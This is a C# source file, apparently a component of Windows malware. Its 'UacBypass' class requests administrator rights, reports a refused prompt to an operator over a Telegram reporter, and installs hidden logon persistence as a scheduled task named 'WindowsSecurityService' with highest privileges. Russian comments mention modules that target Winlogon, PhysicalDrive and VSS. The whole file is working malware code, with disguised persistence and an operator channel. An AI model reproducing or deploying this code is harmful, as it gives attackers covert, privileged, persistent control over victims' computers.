using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Security.Principal;
using System.Windows.Forms;

namespace ns0
{
    internal static class UacBypass
    {
        private const string TaskName = "WindowsSecurityService";

        public static void EnsureElevated()
        {
            if (IsElevated) return;

            string exePath = GetExecutablePath();
            if (string.IsNullOrEmpty(exePath)) return;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true,
                    Verb = "runas"
                };
                Process.Start(psi);
                Environment.Exit(0);
            }
            catch (Win32Exception)
            {
                // Пользователь отказал в UAC. Явная деградация: часть модулей (HKLM,
                // Winlogon, PhysicalDrive, WMI VSS) не сработает — сообщаем оператору
                // и продолжаем в user-режиме, а не умираем тихо.
                try
                {
                    TelegramReporter.ReportComplianceEvent(
                        "UAC_DENIED", "elevation declined, running as user", "WARNING");
                }
                catch { }
                RestrictedMode = true;
            }
            catch
            {
                RestrictedMode = true;
            }
        }

        // true, если работаем без админ-прав — модули, требующие elevation, пропускаются.
        public static bool RestrictedMode { get; private set; }

        private static bool IsElevated
        {
            get
            {
                using (var identity = WindowsIdentity.GetCurrent())
                {
                    var principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
        }

        private static string GetExecutablePath()
        {
            try { return Process.GetCurrentProcess().MainModule.FileName; }
            catch { return System.Reflection.Assembly.GetExecutingAssembly().Location; }
        }

        public static bool InstallElevatedPersistence()
        {
            if (!IsElevated) return false;

            string exePath = GetExecutablePath();
            if (string.IsNullOrEmpty(exePath)) return false;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = string.Format("/Create /TN \"{0}\" /TR \"\\\"{1}\\\"\" /SC ONLOGON /RL HIGHEST /F", TaskName, exePath),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (var proc = Process.Start(psi))
                {
                    if (proc == null) return false;
                    proc.WaitForExit(10000);
                    return proc.ExitCode == 0;
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool RemoveElevatedPersistence()
        {
            if (!IsElevated) return false;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = string.Format("/Delete /TN \"{0}\" /F", TaskName),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (var proc = Process.Start(psi))
                {
                    if (proc == null) return false;
                    proc.WaitForExit(10000);
                    return proc.ExitCode == 0;
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool IsPersistenceInstalled()
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = string.Format("/Query /TN \"{0}\"", TaskName),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var proc = Process.Start(psi))
                {
                    if (proc == null) return false;
                    proc.WaitForExit(10000);
                    return proc.ExitCode == 0;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
